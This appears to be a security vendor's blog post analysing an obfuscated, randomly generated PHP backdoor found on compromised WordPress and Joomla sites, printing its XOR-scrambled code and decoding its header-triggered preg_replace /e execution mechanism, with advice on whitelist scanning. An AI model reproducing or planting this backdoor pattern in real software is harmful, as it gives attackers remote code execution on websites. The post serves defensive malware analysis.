@@ -1,0 +1,59 @@
+Web Malware – Working with Evil Backdoors – Part III
+
+The most complicated part of our job, when cleaning compromised web sites, is ensuring we find all backdoors. If we miss one, the site can be reinfected. We have done a few posts about backdoors already, explaining how they work and in them provide example of what they are and look like:
+
+ASK Sucuri: What about the backdoors?
+Evil backdoors – Part II
+
+However, despite being a very complicated task, most people still think that removing backdoors consist of searching for eval’s, base64_decode and similar keywords. While that will find some, it’s not highly effective.
+Ugly Backdoor
+Today, we will present you the BACKDOOR:UGLY:13 (yes, that’s how we name it). It is a code we are finding on WordPress/Joomla sites compromised with SEO Spam to allow the attackers to reinfect and reinject spam code:
+
+<?php
+$P81J5DkwYm=’CQWnk4mSgxD’^apC4zA_i;$Oq9E1Iip7=ouw&’o}=’;$qkit=’&=’.HZ^’IX=+=-‘;’nyD’.
+‘?’;$ywO_bGCvD=’H]’.pTZYkh.'<G}FC’&hTXXRlZLrO.'[{g’;$eBwDr2V=#w50jH83IO7′.
+‘ ,|:F-2>1u@:”‘.qgQ1.'<*’^EMR.'”@’.tKU2.’$Ln&)(hkx’;$Arb=’>8a’^Mb9;’Tpr’.
+‘rH-AhDxq’;$Wt0cI9t='(h9’|’}.}’;$ON_=eftg.’/l’|F3FDez;$koJhZ=’}’.v.#CF0′.
+‘.=8l`5’&’RVN]m.l}z^H>’;$QgYL=’   “.’.DAMT.’%#Q’|’ $+(<TH@T-#A’;$GDWkPb=’@*’.
+‘%DxM”g#’.HCId.’@^’.ItSA^’xW^sN}@’.OR05.’|Jq./F8|’;$g1MRqXRy=$Oq9E1I&/*_Ikm’.
+‘Uv*/$Wt0cI9t;$Db_3w=$ON_&$qkit;$_izus6=$koJhZ^$QgYL;$gMYmjr=(‘@)+G)F”N#2$t’.
+‘$p4″W-,’|’0!&c`v!,0>4$OP0 f#p’)^$GDWkPbCn5;$DP7=(‘5$ C1=”E+c.’.g27mr.#DfTy’.
+‘%!’.r0x66.'<22@5x’|’!4(2rc>`3a?!73 ‘.cH9a.’$`<34(“y+P’)&(‘{jWR%O.%1m^R%-<B’.
+‘f?W@[#q{];’.ZpqKKG^’J_!’.VG.'[U9%XZ@}’.YJf5.’&LDF$’.MaFIt.'<p’);$niZllS=(#’.
+‘{/7p”‘.fjlb.’ =i,’^’;os0}>?,Qd{(l’)|$_bGCvD;if($g1MRqXRy($Db_3w(/*BZKHhHPA’.
+‘6X$eO*/$gMYmjrlJc))==$DP7)$_izus6((‘=[M{]~o~m}’&’~_W9}>’.iyem),$Db_3w(/*y3′.
+‘n*/$niZ),$eBwDr2V.$ArvQhb.(‘lv^9{p’^'”C<T6M’));#medAQT)W(Azd-,JG ?f.Er?2R’.
+‘z-YAYBxK:@x#4St%.q+_H5^P(XB|+leP9f-{1f’;
+
+Just by looking at the code, you can understand why we named it “Ugly”. There is nothing that we can easily search to identify it as a malicious code. No evals, no base64_decodes. What makes it worse is that it is randomly generated, no two implementations are the same, even on the same site. Only random and ugly code means it gets tagged as Ugly in our labs.
+Decoding the Ugly Backdoor
+The backdoor sets many random variables with XOR’d code and it also embeds comments to make it harder to decode. More irritating, if you break the code into multiple lines it stops working because the way the comments are placed.
+No worries though, we can separate each variable into a new line, making it easier to see:
+
+$P81J5DkwYm=’CQWnk4mSgxD’^apC4rzA_i;
+$Oq9E1Iip7=ouw&’o}=’;
+$qkit=’&=’.HFSZ^’IX=+=-‘;’nyLgMDD’.’?’;
+..
+
+And once we separate them, we see an interesting line:
+
+if($g1MRqXRy($Db_3w(/*BZKHhHPA’.
+‘6X$eO_w0*/$gMYmjrlJc))==$DP7)$_izus6((‘=[M{]~o~m}’&’~_W9}>’.iyem),$Db_3w(/*y3′.
+‘n*/$niZllS),$eBwDr2V.$ArvQhb.(‘lv^9{p’^'”C
+Finally some form! And that’s the meat of the backdoor. If you are not familiar with PHP, the code has an IF statement and a variable being used as a function. So if whatever is expected in the if matches, the code in the function is executed. Let’s see what it does:
+1 – Backdoor trigger
+Once we decode, the if statement “if($g1MRqXRy($Db_3w..” decodes to:
+
+if(md5(getenv(/*BZKHhHPA’.
+‘6X*/HTTP_FAFBFBAAADDEDA))==14f3a80bb8e3a7d77e1e9c4886820970)
+
+Which basically checks if md5 checksum of the environment variable HTTP_FAFBFBAAADDEDA is equal to 14f3a80bb8e3a7d77e1e9c4886820970. So that’s the main trigger.
+2- Code execution
+If that trigger matches, the following function is executed:
+
+preg_replace(*/e/),getenv(HTTP_X_H3G_CC),…x-avantgo-cradle.(N5bmM=));
+
+The Preg_replace function in PHP has a interesting “feature”, which if you pass the /e modifier (PREG_REPLACE_EVAL), it will execute any code using a eval. So there it is, if the header “HTTP_FAFBFBAAADDEDA” is present and the md5() is equal to 14f3a80bb8e3a7d77e1e9c4886820970, it will call preg_replace and execute whatever content is inside the HTTP_X_H3G_CC header.
+Conclusion
+This post is just another example why we can not rely on blacklisting to search for backdoors. If your site is compromised, you have to scan all the files using both a white listing approach + blacklisting + add some human intelligence to make sure nothing is missed. Additionally, you can’t just depend on a scan of the directory that houses the site, if you house multiple sites you have to search all your directories. More and more attackers are making use of surrounding environments making the traditional scanning methods null and void.
+Our free sitecheck scanner can also help identify if there is any external malware present on the site, but it will not find backdoors. If you’re a client, you’ll want to enable server-side scanning and will want to have us scan the entire environment.
